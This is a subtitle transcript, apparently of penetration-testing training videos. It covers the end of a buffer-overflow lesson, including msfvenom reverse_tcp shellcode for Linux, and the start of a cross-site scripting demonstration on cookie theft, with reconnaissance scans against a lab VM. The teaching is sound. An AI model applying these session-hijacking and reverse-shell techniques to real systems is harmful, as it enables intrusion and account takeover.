--> 00:19:11.945\nwhen that thing pops back over,\nand says C colon, who am I?\n\n378\n00:19:11.945 --> 00:19:16.490\nAdministrator, create local user account,\nput it in the administrator's group.\n\n379\n00:19:16.490 --> 00:19:20.609\nAnd you do that, you're so\nexcited, it's so much fun.\n\n380\n00:19:20.609 --> 00:19:23.042\nOf course,\nnow you've gotta tell your customer that.\n\n381\n00:19:23.042 --> 00:19:26.754\nAnd we were able to you know that in\nhouse thing you guys wrote, it's totally\n\n382\n00:19:26.754 --> 00:19:30.473\nvulnerable to a buffer overflow [LAUGH]\ncuz we kind of exploited your system.\n\n383\n00:19:30.473 --> 00:19:32.416\n&gt;&gt; Yeah, but that's what they pay us for,\n\n384\n00:19:32.416 --> 00:19:35.460\nto find those vulnerabilities\nbefore the bad guys do, right?\n\n385\n00:19:35.460 --> 00:19:39.194\nSo fantastic Daniel, tell you what\nquestion for you, now we looked at this\n\n386\n00:19:39.194 --> 00:19:42.770\nfrom the Windows perspective, so\nan application running on Windows.\n\n387\n00:19:42.770 --> 00:19:46.015\nIs Linux immune to the whole\nbuffer overflow thing?\n\n388\n00:19:46.015 --> 00:19:49.240\n&gt;&gt; Nope, it's a program like anything\nelse, services like anything else.\n\n389\n00:19:49.240 --> 00:19:51.153\nThey have their own\nbuffer overflows as well,\n\n390\n00:19:51.153 --> 00:19:53.616\nyou can do buffer overflows\ninside of a Linux environment.\n\n391\n00:19:53.616 --> 00:19:56.425\nI wont' go back through the entirety\nof that, obviously, but\n\n392\n00:19:56.425 --> 00:19:58.608\nI'll show you some of\nthe options that you have.\n\n393\n00:19:58.608 --> 00:19:59.981\nLet's go back to my screen.\n\n394\n00:19:59.981 --> 00:20:02.138\nI'll close these down here,\nso I'll exit out.\n\n395\n00:20:02.138 --> 00:20:03.174\nThank you, good bye.\n\n396\n00:20:03.174 --> 00:20:07.453\nClose this, close this,\nand inside of Kali,\n\n397\n00:20:07.453 --> 00:20:12.080\nthey have quite a few\nunder reverse engineering.\n\n398\n00:20:13.660 --> 00:20:17.902\nI like this one the best, this EBD bugger.\n\n399\n00:20:17.902 --> 00:20:21.291\nAnd I like it because that\nlooks very similar to immunity,\n\n400\n00:20:21.291 --> 00:20:23.582\nand it works very similar to immunity.\n\n401\n00:20:23.582 --> 00:20:25.197\nSo, I like that one a lot.\n\n402\n00:20:25.197 --> 00:20:27.273\nOllyDbg is in here as well.\n\n403\n00:20:27.273 --> 00:20:30.340\nWith that, I think it only works for\nWindows 32 programs.\n\n404\n00:20:30.340 --> 00:20:32.991\nSo, yeah.\n\n405\n00:20:32.991 --> 00:20:33.868\nWhere did you go?\n\n406\n00:20:33.868 --> 00:20:36.318\nI totally cannot do this.\n\n407\n00:20:36.318 --> 00:20:38.192\nOllyDbg, there you go.\n\n408\n00:20:38.192 --> 00:20:43.078\nThere it is, OllyDbg you can attach,\ndo the whole file, attach and\n\n409\n00:20:43.078 --> 00:20:45.530\nexit, whatever you wanna do.\n\n410\n00:20:45.530 --> 00:20:46.925\nThose are some options as well.\n\n411\n00:20:46.925 --> 00:20:51.898\nWhat else do we, MSFvenom works\na little differently because you have\n\n412\n00:20:51.898 --> 00:20:54.360\nto tell it this is a Linux system.\n\n413\n00:20:54.360 --> 00:20:56.119\nRemember, when you create your shell code,\n\n414\n00:20:56.119 --> 00:20:58.355\nyou’re not gonna use the exact\nsame commands as before.\n\n415\n00:20:58.355 --> 00:20:59.691\nLet me open a-\n&gt;&gt; So\n\n416\n00:20:59.691 --> 00:21:02.281\nthe dash P change our platforms\n&gt;&gt; Yeah,\n\n417\n00:21:02.281 --> 00:21:05.660\nyeah let me get an open terminal here and\njust show you real quickly.\n\n418\n00:21:05.660 --> 00:21:08.674\nThe manual page is actually\nquite helpful with this.\n\n419\n00:21:08.674 --> 00:21:14.404\nShift+Ctrl ++,\n\n420\n00:21:14.404 --> 00:21:19.800\nand man ssfvenom.\n\n421\n00:21:19.800 --> 00:21:21.690\nAnd I'll just do a search for Linux.\n\n422\n00:21:24.030 --> 00:21:26.467\nGo to the next.\n\n423\n00:21:26.467 --> 00:21:27.547\nThere we go.\n\n424\n00:21:27.547 --> 00:21:28.401\nYou can see,\n\n425\n00:21:28.401 --> 00:21:33.460\nit's kinda giving you some help here\nwith examples of how you should do that.\n\n426\n00:21:33.460 --> 00:21:37.518\nPlatform Linux-p,\nactually here's a reverse_tcp l host.\n\n427\n00:21:37.518 --> 00:21:41.544\nSo, some of its the same but you gotta\nremember to tell it which type of platform\n\n428\n00:21:41.544 --> 00:21:44.260\nit is, and things of that nature, right.\n\n429\n00:21:44.260 --> 00:21:48.883\nSo just be aware all the concepts that we\ndid, all are the same just the syntax and\n\n430\n00:21:48.883 --> 00:21:51.367\nthings are different because it is Linux.\n\n431\n00:21:51.367 --> 00:21:52.735\nIt's not Windows.\n\n432\n00:21:52.735 --> 00:21:54.817\n&gt;&gt;

00:00:21.704\nAnd in this episode,\n\n9\n00:00:21.704 --> 00:00:26.760\nwe're gonna be focusing in on\nweb apps cross-site scripting.\n\n10\n00:00:26.760 --> 00:00:29.671\nIt's a type of attack that is actually\na very common type of attack.\n\n11\n00:00:29.671 --> 00:00:35.512\nI know that it's on the OWASP top 10\njust about every year if not every year.\n\n12\n00:00:35.512 --> 00:00:39.040\nSo here to explain what the heck they are,\nhow they work and\n\n13\n00:00:39.040 --> 00:00:41.930\nshow us a little bit of it Is Mr.\nDaniel Lowrie.\n\n14\n00:00:41.930 --> 00:00:42.890\nWelcome back,

right over your tongue.\n\n21\n00:00:49.955 --> 00:00:54.229\nBut today is all about cross-site\nscripting and it's, when I first heard of\n\n22\n00:00:54.229 --> 00:00:59.114\ncross-site scripting, I thought it was a,\nwhat do they mean cross-site scripting?\n\n23\n00:00:59.114 --> 00:01:02.240\nI get cross, I get site, I get scripting.\n\n24\n00:01:02.240 --> 00:01:04.630\nI just don't understand what it means\nwhen you put all that together.\n\n25\n00:01:04.630 --> 00:01:06.590\nSo that's what we're gonna\ntry to work through today.\n\n26\n00:01:06.590 --> 00:01:08.990\nSo that you understand what\ncross-site scripting is and\n\n27\n00:01:08.990 --> 00:01:12.780\nof course, like a day without sunshine,\nwhat would be my show without actually\n\n28\n00:01:12.780 --> 00:01:15.630\nshowing you how to perform\na cross-site scripting attack?\n\n29\n00:01:15.630 --> 00:01:17.750\nSo that's what we're going to do as well.\n\n30\n00:01:17.750 --> 00:01:19.160\nSo let's start at the beginning right?\n\n31\n00:01:19.160 --> 00:01:21.420\nGentlemen and ladies,\nthis is a football, right?\n\n32\n00:01:21.420 --> 00:01:23.180\nThis is cross-site scripting.\n\n33\n00:01:23.180 --> 00:01:23.710\nWhat is it?\n\n34\n00:01:23.710 --> 00:01:28.499\nIt is the ability to inject code into\nsomebody else's vulnerable sites, and\n\n35\n00:01:28.499 --> 00:01:32.782\nhave it execute to somebody's client,\nif that makes sense, okay?\n\n36\n00:01:32.782 --> 00:01:36.337\nSo you've got a website out there,\nit's vulnerable for\n\n37\n00:01:36.337 --> 00:01:41.221\nme to be able to put code into it, now\nwe're going to talk about how that works,\n\n38\n00:01:41.221 --> 00:01:46.740\nand then when a user comes along and\nsays, I want to go to this website.\n\n39\n00:01:46.740 --> 00:01:49.620\nAnd they visit that page where\nthat malicious code exists,\n\n40\n00:01:49.620 --> 00:01:53.732\nthe code executes and\nthings happen to their client.\n\n41\n00:01:53.732 --> 00:02:00.010\n&gt;&gt; It's a really dangerous type of attack\nbecause you as a customer of a website,\n\n42\n00:02:00.010 --> 00:02:04.540\na visitor to a web page,\nyou don't have to be vulnerable, right?\n\n43\n00:02:04.540 --> 00:02:07.770\nYour system is patched up,\nyou're doing the right things,\n\n44\n00:02:07.770 --> 00:02:10.880\nyou're making sure that you've got\nthe latest security updates and all that.\n\n45\n00:02:10.880 --> 00:02:13.290\nYou're just visiting a website and\n\n46\n00:02:13.290 --> 00:02:17.760\nthe problem is your browser is doing\nexactly what it's supposed to do.\n\n47\n00:02:17.760 --> 00:02:20.950\nIt's interpreting what's being\nsent to it and it's executing it.\n\n48\n00:02:20.950 --> 00:02:26.370\nThe problem is the website was vulnerable\nand so in order to attack you, I said let\n\n49\n00:02:26.370 --> 00:02:30.380\nme go around about and hit the website and\nthen have that attack launch from there.\n\n50\n00:02:30.380 --> 00:02:31.630\nSo it's really scary,\n\n51\n00:02:31.630 --> 00:02:35.380\nit's really dangerous and\nhard to protect against as an individual.\n\n52\n00:02:35.380 --> 00:02:37.870\nIt's the corporations that\nare hosting the web servers\n\n53\n00:02:37.870 --> 00:02:38.760\nthat need to protect against it.\n\n54\n00:02:38.760 --> 00:02:39.730\n&gt;&gt; That's exactly right.\n\n55\n00:02:39.730 --> 00:02:41.750\nIt's not your fault per se, right?\n\n56\n00:02:41.750 --> 00:02:43.590\nAll you did was browse to a website.\n\n57\n00:02:43.590 --> 00:02:45.730\nYou just wanna take\nadvantage of the Internet.\n\n58\n00:02:45.730 --> 00:02:47.650\nAs any of us would rightfully want to do.\n\n59\n00:02:47.650 --> 00:02:48.230\nIt's a lot of fun.\n\n60\n00:02:48.230 --> 00:02:51.207\nLot of cool stuff out there for\nus to learn and see and participate in.\n\n61\n00:02:51.207 --> 00:02:51.731\n&gt;&gt; We're out there!\n\n62\n00:02:51.731 --> 00:02:53.970\n&gt;&gt; Right!\nHey, ITProTV, go check it out, right?\n\n63\n00:02:53.970 --> 00:02:56.430\nThat being said, you gotta remember this.\n\n64\n00:02:56.430 --> 00:03:02.050\nBecause it does affect the end user, that\nis what the intention is typically for.\n\n65\n00:03:02.050 --> 00:03:04.800\nI want to get to users, and\n\n66\n00:03:04.800 --> 00:03:08.780\nnot necessarily attack the website\nwhere I've put my malicious code.\n\n67\n00:03:08.780 --> 00:03:11.750\nI'm just using that as\na spring board of operations,\n\n68\n00:03:11.750 --> 00:03:14.690\nas it were, to get at end users.\n\n69\n00:03:14.690 --> 00:03:16.140\n&gt;&gt; That's my attack vector.\n\n70\n00:03:16.140 --> 00:03:16.960\n&gt;&gt; Yeah, yeah.\n\n71\n00:03:16.960 --> 00:03:17.790\nPerfect, exactly.\n\n72\n00:03:17.790 --> 00:03:20.353\nThe attack vector,\nwhere it's coming from, right?\n\n73\n00:03:20.353 --> 00:03:22.360\nSo keep that in mind\nas we go through here.\n\n74\n00:03:22.360 --> 00:03:26.670\nWe're not attacking their website,\nwe're attacking the users that visit their\n\n75\n00:03:26.670 --> 00:03:30.807\nwebsite, they just happened to leave the\ndoor open for us to be able to do that.\n\n76\n00:03:30.807 --> 00:03:33.590\nSo that's cross-site scripting in a ball.\n\n77\n00:03:33.590 --> 00:03:35.810\nLet me see if there's anything else\nI wanted to mention about that.\n\n78\n00:03:35.810 --> 00:03:39.220\nTypically, the payloads are going\nto be in some sort of HTML or\n\n79\n00:03:39.220 --> 00:03:43.870\nJava scripting because they're web\ntype of programming languages.\n\n80\n00:03:43.870 --> 00:03:45.370\nSo if you're running a browser,\nwhat does it do?\n\n81\n00:03:45.370 --> 00:03:47.450\nIt interprets web programming languages.\n\n82\n00:03:47.450 --> 00:03:48.516\nSo that's why we typically see those.\n\n83\n00:03:52.120 --> 00:03:53.910\nWho are we targeting normally?\n\n84\n00:03:53.910 --> 00:03:56.750\nRight.\nIf I'm the bad guy, if I'm the actor or\n\n85\n00:03:56.750 --> 00:03:59.790\nif I'm a penetration tester trying\nto do a company's Internet site or\n\n86\n00:03:59.790 --> 00:04:02.170\nsomething to that affect,\nwho am I looking for?\n\n87\n00:04:02.170 --> 00:04:07.560\nWell, I'll take anybody I can get but,\nas always, we're looking for admins.\n\n88\n00:04:07.560 --> 00:04:11.450\nWe wanna get a hold of those\npeople's information or\n\n89\n00:04:11.450 --> 00:04:14.510\ntake advantage of their browser,\nget them to send us information.\n\n90\n00:04:14.510 --> 00:04:15.630\nWhatever the case is.\n\n91\n00:04:15.630 --> 00:04:18.325\nWe wanna go for the good stuff, right?\n\n92\n00:04:18.325 --> 00:04:20.590\nThat's our intended targets.\n\n93\n00:04:20.590 --> 00:04:22.200\nSometimes it's just anybody and\n\n94\n00:04:22.200 --> 00:04:26.300\ntheir brother will do cuz that gives\nme another attack vector to go for.\n\n95\n00:04:26.300 --> 00:04:27.760\nAll right,\nlet's see what else do we wanna hear?\n\n96\n00:04:27.760 --> 00:04:31.100\nHow do we check to see if\nour website is vulnerable?\n\n97\n00:04:31.100 --> 00:04:34.880\nThat is a good question and\ntypically we do that\n\n98\n00:04:34.880 --> 00:04:40.062\nby looking using vulnerability scanners,\nlooking for a good code.\n\n99\n00:04:40.062 --> 00:04:44.860\nYou wanna check and make sure that if you\nhave a programmer that's building your\n\n100\n00:04:44.860 --> 00:04:50.029\nsite, verify with them are you\nusing input sanitation?\n\n101\n00:04:51.350 --> 00:04:54.260\nWhen I put something\ninto input into our site,\n\n102\n00:04:54.260 --> 00:04:58.700\ndoes it go through some sort of washing,\nscrubbing, microscopic looking thing?\n\n103\n00:04:58.700 --> 00:05:03.275\nIs this what I expect to see and if it's\nnot, we dump that and give them an error?\n\n104\n00:05:03.275 --> 00:05:04.370\nOr is it just allowing that to happen?\n\n105\n00:05:04.370 --> 00:05:08.381\nWe're gonna see that it's typical with\na lot of web-based attacks, is that\n\n106\n00:05:08.381 --> 00:05:13.133\nthe programmer's developments, and don't\nget me wrong, it's not that they're trying\n\n107\n00:05:13.133 --> 00:05:17.637\nto be insecure, things get overlooked, and\nwe have to continually look and search for\n\n108\n00:05:17.637 --> 00:05:22.485\nholes in the code for problems so that\nthese types of things don't come through.\n\n109\n00:05:22.485 --> 00:05:23.979\nYou and I as penetration testers,\n\n110\n00:05:23.979 --> 00:05:26.928\nwe're gonna intervene with things\nlike vulnerability scanners.\n\n111\n00:05:26.928 --> 00:05:33.220\nWill they find that cross-site scripting\nability in there, that can help.\n\n112\n00:05:33.220 --> 00:05:35.336\nAnd we can just peruse\nthe website looking for\n\n113\n00:05:35.336 --> 00:05:38.760\ncertain things that would key us\noff that this might be vulnerable.\n\n114\n00:05:38.760 --> 00:05:42.840\n&gt;&gt; And you might think as an organization\nwhy would I even bother looking for this?\n\n115\n00:05:42.840 --> 00:05:45.310\nIt's just told me it's not\naffecting my web server,\n\n116\n00:05:45.310 --> 00:05:49.490\nit's the people that are visiting my site\nbut I think common sense will tell you.\n\n117\n00:05:49.490 --> 00:05:52.370\nYou don't want your visitors\ncoming to your site, get infected,\n\n118\n00:05:52.370 --> 00:05:56.250\nand then word gets out that hey,\nthis is a dangerous site, don't go to it.\n\n119\n00:05:56.250 --> 00:05:59.330\nDon't spend your money there, God forbid,\nput your credit card information in there\n\n120\n00:05:59.330 --> 00:06:01.285\nbecause I got infected\njust visiting their site.\n\n121\n00:06:01.285 --> 00:06:05.042\nSo who knows what's gonna happen if\nyou try to buy something from them, so\n\n122\n00:06:05.042 --> 00:06:09.222\nas an organization, I definitely wanna\nmake sure I'm protected against this cuz\n\n123\n00:06:09.222 --> 00:06:12.208\nthat's my reputation of my\nbusiness that's on the line.\n\n124\n00:06:12.208 --> 00:06:16.192\n&gt;&gt; Yeah, you as an entity out there don't\nwant to be providing a platform for\n\n125\n00:06:16.192 --> 00:06:19.672\nbad actors to do something against\nyour users, that's a great way for\n\n126\n00:06:19.672 --> 00:06:21.592\npeople to go, well,\nI'm never going there again, right?\n\n127\n00:06:21.592 --> 00:06:24.932\nAnd then your site shuts down\nbecause your traffic drops down.\n\n128\n00:06:24.932 --> 00:06:30.440\nSo, if you have any kind of form\non your website that allows for\n\n129\n00:06:30.440 --> 00:06:34.700\nany user to input into the system,\ncuz that's what's happening here.\n\n130\n00:06:34.700 --> 00:06:37.180\nI'm coming in,\nI'm not an authority in the system.\n\n131\n00:06:37.180 --> 00:06:41.698\nYou're giving me input access that\nthen takes that input, stores it.\n\n132\n00:06:41.698 --> 00:06:46.280\nAnd if you're not doing any kind of\nsanitation then it's going to execute code\n\n133\n00:06:46.280 --> 00:06:50.110\nas people come to that site, because it\njust becomes part of the code of the page.\n\n134\n00:06:50.110 --> 00:06:51.650\nSo that's what we're looking out for.\n\n135\n00:06:51.650 --> 00:06:55.250\nSo things like comment sections on blogs,\n\n136\n00:06:55.250 --> 00:06:58.760\nanywhere where you can\ninput from anywhere, right.\n\n137\n00:06:58.760 --> 00:07:00.740\nSo if you're just a random user,\nyou come to the site.\n\n138\n00:07:00.740 --> 00:07:03.000\nAnd I say hey, leave comments here,\n\n139\n00:07:03.000 --> 00:07:07.980\nor just anything where there's\ninput that will store on the page.\n\n140\n00:07:07.980 --> 00:07:10.438\n&gt;&gt; And just about every website you go\nto nowadays has this at some point,\n\n141\n00:07:10.438 --> 00:07:12.030\nespecially if you're gonna buy something.\n\n142\n00:07:12.030 --> 00:07:16.332\nOr they'll make you register in order to\nread the rest of the forum posts that\n\n143\n00:07:16.332 --> 00:07:20.702\nyou're reading, so they're taking input,\nthey want your email address,\n\n144\n00:07:20.702 --> 00:07:24.737\nthey want your name and maybe some\ndemographical information as well or\n\n145\n00:07:24.737 --> 00:07:27.860\nlike you said hey write a comment here.\n\n146\n00:07:27.860 --> 00:07:29.870\nSo you see the input everywhere.\n\n147\n00:07:29.870 --> 00:07:33.480\n&gt;&gt; Yeah, forums right, that's kind of what\nthe whole purpose of a forum is, it's for\n\n148\n00:07:33.480 --> 00:07:36.560\nyou to be able to log in and\nleave a comment and\n\n149\n00:07:36.560 --> 00:07:37.900\nthen have a thread going, right?\n\n150\n00:07:37.900 --> 00:07:42.020\nSo that's where we're gonna see these\nthings executed because it allows\n\n151\n00:07:42.020 --> 00:07:45.674\nme as an end user to input code into\nthe system and leave it there for\n\n152\n00:07:45.674 --> 00:07:47.951\nsomeone else to come by and get hit by it.\n\n153\n00:07:47.951 --> 00:07:49.865\nSo, let's move on here.\n\n154\n00:07:49.865 --> 00:07:53.835\nLet's talk about some common\ncross-site scripting type of attacks.\n\n155\n00:07:53.835 --> 00:07:55.078\nOne is browser redirection.\n\n156\n00:07:55.078 --> 00:07:58.938\nI can put in code in there to say,\nredirect to this site,\n\n157\n00:07:58.938 --> 00:08:00.757\nor redirect to that site.\n\n158\n00:08:00.757 --> 00:08:06.850\nAnd if you have spent any time in\nsecurity, you know about this, right.\n\n159\n00:08:06.850 --> 00:08:11.430\nYou get an email that says click this\nlink so that you can claim your prize or\n\n160\n00:08:11.430 --> 00:08:12.330\nwhatever.\n\n161\n00:08:12.330 --> 00:08:14.400\nAnd as a browser redirection\nis taking you somewhere else.\n\n162\n00:08:14.400 --> 00:08:15.814\nIt says Facebook.com.\n\n163\n00:08:15.814 --> 00:08:17.000\nIt says ITPro.TV.\n\n164\n00:08:17.000 --> 00:08:18.240\nIt doesn't say that.\n\n165\n00:08:18.240 --> 00:08:20.530\nIt never has ours on there.\n\n166\n00:08:20.530 --> 00:08:21.669\nBut so you have to check the URL and\n\n167\n00:08:21.669 --> 00:08:24.110\nmake sure that it's taking you\nwhere you're supposed to go.\n\n168\n00:08:24.110 --> 00:08:28.138\nWe can do that with the code, it's just\nembedded into the code of the website to\n\n169\n00:08:28.138 --> 00:08:31.025\nredirect to the user that\ncomes to a different website.\n\n170\n00:08:31.025 --> 00:08:34.723\nAnd that's really good for the attacker\nbecause they can glean a lot of\n\n171\n00:08:34.723 --> 00:08:38.798\ninformation that way and it can set them\nup for things like client side attacks\n\n172\n00:08:38.798 --> 00:08:42.071\nwhich we are going to discuss and\nshow you upcoming very soon.\n\n173\n00:08:42.071 --> 00:08:44.960\nAlso good for session hijacking,\ncookie stealing.\n\n174\n00:08:44.960 --> 00:08:46.460\nThis is one of the big ones, right?\n\n175\n00:08:46.460 --> 00:08:47.900\nThis is a big deal.\n\n176\n00:08:47.900 --> 00:08:53.490\nThat I'm able to take over your session\nas an end user because when you log in,\n\n177\n00:08:53.490 --> 00:08:55.250\nit gives you a session cookie, right?\n\n178\n00:08:55.250 --> 00:08:57.710\nAnd then you have that cookie and\nas long as that cookie is valid for\n\n179\n00:08:57.710 --> 00:09:01.660\nx amount of time or as long as you\ndon't log out, the cookie is valid.\n\n180\n00:09:03.220 --> 00:09:08.940\nI can grab that cookie, put it into\nmy browser, and it thinks I'm you.\n\n181\n00:09:08.940 --> 00:09:10.930\nSo it's kind of this\nmasquerading type of effect.\n\n182\n00:09:10.930 --> 00:09:12.420\n&gt;&gt; Yeah.\nAnd depending on what the company has\n\n183\n00:09:12.420 --> 00:09:16.250\nchosen to put or store in those cookies,\ncuz that can vary,\n\n184\n00:09:16.250 --> 00:09:19.990\nthey might just be simply storing your\nusername and password to access the site.\n\n185\n00:09:19.990 --> 00:09:20.870\nBut they may be storing,\n\n186\n00:09:20.870 --> 00:09:24.580\nif you've enabled any kind of one-click\npurchase options and things like that.\n\n187\n00:09:24.580 --> 00:09:29.290\nA lot of times, we can store credit\ncard information in those cookies, cuz,\n\n188\n00:09:29.290 --> 00:09:32.980\ngosh forbid, we'd have to type that number\nin every time we wanna buy something.\n\n189\n00:09:32.980 --> 00:09:36.190\nAnd so, if they steal that, as you said,\nthey're basically impersonating you,\n\n190\n00:09:36.190 --> 00:09:38.550\nand anything else that's\nstored in that cookie,\n\n191\n00:09:38.550 --> 00:09:40.340\ntheir browser can now\nsubmit to the website.\n\n192\n00:09:40.340 --> 00:09:42.810\nAnd the website's gonna\ntrust the information\n\n193\n00:09:42.810 --> 00:09:44.520\nbecause it's their cookie, right?\n\n194\n00:09:44.520 --> 00:09:46.210\nAnd so\nit's just doing what it's supposed to do.\n\n195\n00:09:46.210 --> 00:09:47.200\n&gt;&gt; That's exactly right.\n\n196\n00:09:47.200 --> 00:09:52.060\nSo, that being said, let's talk about\nhow can we actually perform this task?\n\n197\n00:09:52.060 --> 00:09:57.160\nHow can we do a session hijack,\nsteal cookie, and impersonate\n\n198\n00:09:57.160 --> 00:10:00.450\nsomebody else that was a user on that\nsite, hopefully, the administrator.\n\n199\n00:10:00.450 --> 00:10:04.740\nWell the good news is we have an attack\nplatform that's perfect for this.\n\n200\n00:10:04.740 --> 00:10:10.306\nI downloaded a virtual machine\nfrom volnhub.com called,\n\n201\n00:10:10.306 --> 00:10:16.328\nI think it's MySQL, yeah,\nI wrote it down here, xss-MySQL.\n\n202\n00:10:16.328 --> 00:10:19.100\nSo right here,\nI kinda made a directory for it.\n\n203\n00:10:19.100 --> 00:10:22.150\nBut you can go to volnhub.com, and we'd\nlike to give a shout out to those guys,\n\n204\n00:10:22.150 --> 00:10:24.050\nthank you guys for\nallowing us to use these for\n\n205\n00:10:24.050 --> 00:10:26.460\ndemonstration purposes for our viewers.\n\n206\n00:10:26.460 --> 00:10:29.190\nSuper awesome style that you did for\nus, I appreciate that.\n\n207\n00:10:29.190 --> 00:10:30.190\nSo you guys can go there, and\n\n208\n00:10:30.190 --> 00:10:33.230\nif you want to do exactly what it\nis I'm doing, you can follow along.\n\n209\n00:10:33.230 --> 00:10:34.660\nYou just have to have your Kali box up and\n\n210\n00:10:34.660 --> 00:10:38.770\nrunning, fire off this virtual machine,\nit should be very simple to get up and\n\n211\n00:10:38.770 --> 00:10:42.420\nrunning if you work with\nvirtualization at all, very simple.\n\n212\n00:10:42.420 --> 00:10:45.460\nI don't think even it's that large\nof a file so just fire that off,\n\n213\n00:10:45.460 --> 00:10:47.930\nget them in a sand bust network.\n\n214\n00:10:47.930 --> 00:10:50.170\nRemember, we don't want these things\ntouching the internet because they\n\n215\n00:10:50.170 --> 00:10:54.220\nare vulnerable by design but it's gonna\nallow us to show you how to do these\n\n216\n00:10:54.220 --> 00:10:57.930\nthings, and then you can practice\nthe exact same techniques as well.\n\n217\n00:10:57.930 --> 00:11:04.390\nAll right, so I do have that machine\nrunning, there it is right here.\n\n218\n00:11:04.390 --> 00:11:05.890\nIt's just sitting here doing nothing,\n\n219\n00:11:05.890 --> 00:11:09.070\nwaiting, running a website is what it's\ndoing, and I say it's doing nothing.\n\n220\n00:11:09.070 --> 00:11:09.850\nIt's running a website.\n\n221\n00:11:11.110 --> 00:11:12.203\nHere's my Kali box,\n\n222\n00:11:12.203 --> 00:11:15.606\nI like to create directories to keep\nthings a little more ordered so\n\n223\n00:11:15.606 --> 00:11:19.401\nwe're gonna work with some files that\nI have in here so that we can do this.\n\n224\n00:11:19.401 --> 00:11:24.254\nBut if I go to my web browser, I also\nwant to show you one more thing that\n\n225\n00:11:24.254 --> 00:11:28.607\nyou should get installed so\nthat you can do this technique is,\n\n226\n00:11:28.607 --> 00:11:34.430\nif I go into my tools I have this little\nplugin called Cookie Managers Plus.\n\n227\n00:11:34.430 --> 00:11:38.550\nGreat tool, download it, it is,\nI guess it runs for chrome I'm not sure.\n\n228\n00:11:38.550 --> 00:11:42.360\nI run Firefox,\nIceWeasel is what comes with Kali.\n\n229\n00:11:42.360 --> 00:11:45.540\nAnd IceWeasel is a derivative of Firefox,\nis basically Firefox.\n\n230\n00:11:45.540 --> 00:11:48.200\nSo all the Firefox plugins will work here.\n\n231\n00:11:48.200 --> 00:11:49.400\nI'm just not sure if it works for Chrome.\n\n232\n00:11:49.400 --> 00:11:51.300\nI know it works for Firefox.\n\n233\n00:11:51.300 --> 00:11:55.030\nSo there you go, download Cookies Managers\nPlus cuz we're going to need that so\n\n234\n00:11:55.030 --> 00:11:57.760\nthat we can perpetrate this attack.\n\n235\n00:11:57.760 --> 00:12:02.235\nThat being said, I'll just shrink\nmy browser and let's get started.\n\n236\n00:12:02.235 --> 00:12:03.115\nAs in any pen test,\n\n237\n00:12:03.115 --> 00:12:06.310\nwe got to scan for the systems,\nfind out what their IP addresses are.\n\n238\n00:12:06.310 --> 00:12:09.420\nSo we'll just kind of take you through\nthat little process very quickly.\n\n239\n00:12:09.420 --> 00:12:13.160\nYou can do a ping sweep,\nyou can do an Nmap's ping sweep.\n\n240\n00:12:13.160 --> 00:12:19.588\nSince I'm on a local network together,\nI can do net discover, like that and\n\n241\n00:12:19.588 --> 00:12:23.496\n-i and give it eth0,\nthat's my ethernet adaptor.\n\n242\n00:12:23.496 --> 00:12:28.725\nAnd then -r for range and\nwhat range of IPs we're on,\n\n243\n00:12:28.725 --> 00:12:34.920\n101.68.29.1 and\nthen slash use the side notation.\n\n244\n00:12:34.920 --> 00:12:38.400\nIt return, that's a start,\nhopefully seeing some stuff here.\n\n245\n00:12:38.400 --> 00:12:39.620\nThere we go.\n\n246\n00:12:39.620 --> 00:12:44.018\nAnd I know 200 is my Windows machine,\n254 is the gateway,\n\n247\n00:12:44.018 --> 00:12:48.100\n1 is my MacBook and then so\n157 must be my culprit there.\n\n248\n00:12:48.100 --> 00:12:49.830\nThat must be what I'm looking for.\n\n249\n00:12:49.830 --> 00:12:54.360\nSo I'll do Ctrl C and\nthat will run an NMAP scan.\n\n250\n00:12:54.360 --> 00:12:58.845\nI'll do a -a which includes some\nNMAP scripting engine stuff,\n\n251\n00:12:58.845 --> 00:13:03.770\nnon-dangerous scripts usually in there.\n\n252\n00:13:03.770 --> 00:13:05.211\nI think, all of them are non-dangerous so\n\n253\n00:13:05.211 --> 00:13:07.370\nyou don't have to worry\nabout crashing anything.\n\n254\n00:13:07.370 --> 00:13:09.730\nBut it does still glean\na lot of good information.\n\n255\n00:13:09.730 --> 00:13:12.371\nAlso does a scene scan.\n\n256\n00:13:12.371 --> 00:13:13.810\n&gt;&gt; There's always fingerprinting.\n\n257\n00:13:13.810 --> 00:13:15.100\n&gt;&gt; Yeah, always fingerprinting.\n\n258\n00:13:15.100 --> 00:13:16.280\n&gt;&gt; Versioning.\n&gt;&gt; Versioning.\n\n259\n00:13:16.280 --> 00:13:17.540\nThe whole nine yards.\n\n260\n00:13:17.540 --> 00:13:21.520\nIt's, DASH A is kind of an all-in-one for\nNmap.\n\n261\n00:13:21.520 --> 00:13:24.220\nAnd then I like to,\nbecause it's pen testing,\n\n262\n00:13:24.220 --> 00:13:27.510\ngive it a little more of aggressive\ntiming so it goes a little faster.\n\n263\n00:13:27.510 --> 00:13:32.920\nI also want to look at every port and\nthat should be good and\n\n264\n00:13:32.920 --> 00:13:38.610\nI'll give it the IP 102.168.209.157 and\nwe'll fire that off.\n\n265\n00:13:38.610 --> 00:13:42.170\nTypically, I would output that to\na file so I can look at it later.\n\n266\n00:13:42.170 --> 00:13:45.700\nIt's just part of my methodology but you\ndon't have to do that if you don't want\n\n267\n00:13:45.700 --> 00:13:47.770\nit, you just continually run\nMF scans if you feel like it.\n\n268\n00:13:47.770 --> 00:13:49.260\nYou never know when things change.\n\n269\n00:13:49.260 --> 00:13:51.380\nMaybe a new port comes up and doesn't.\n\n270\n00:13:51.380 --> 00:13:53.820\nBut I know that I'm not doing that here so\nI like to do that.\n\n271\n00:13:53.820 --> 00:13:55.760\nIt keeps things very simple.\n\n272\n00:13:55.760 --> 00:13:59.200\nI know things like, it's taking forever,\nwhile it's doing that, I'm gonna run also\n\n273\n00:13:59.200 --> 00:14:04.190\ndown here my Nitko scan, which is the scan\nfor vulnerabilities inside of websites.\n\n274\n00:14:04.190 --> 00:14:06.790\nAnd look, Nmap's already done.\n\n275\n00:14:06.790 --> 00:14:09.620\nSo there it is, it is telling\nus that port 22 is open, SSH.\n\n276\n00:14:09.620 --> 00:14:13.720\nGives us the SSH host keys,\nthe DSA and the RSA.\n\n277\n00:14:13.720 --> 00:14:15.400\nAnd then there's good old port A, so\n\n278\n00:14:15.400 --> 00:14:19.190\nI know a web server's running\non 192.168 on that device.\n\n279\n00:14:21.960 --> 00:14:26.535\nAnd it tells me a lot about it too,\napache 2.2.6, it's on a WN system,\n\n280\n00:14:26.535 --> 00:14:31.220\nwhere it came from some http title info,\nvery good stuff.\n\n281\n00:14:31.220 --> 00:14:36.252\nSo let's run that Nikto scan as well,\nN I K T O -H for host and\n\n282\n00:14:36.252 --> 00:14:43.729\nthen its just the 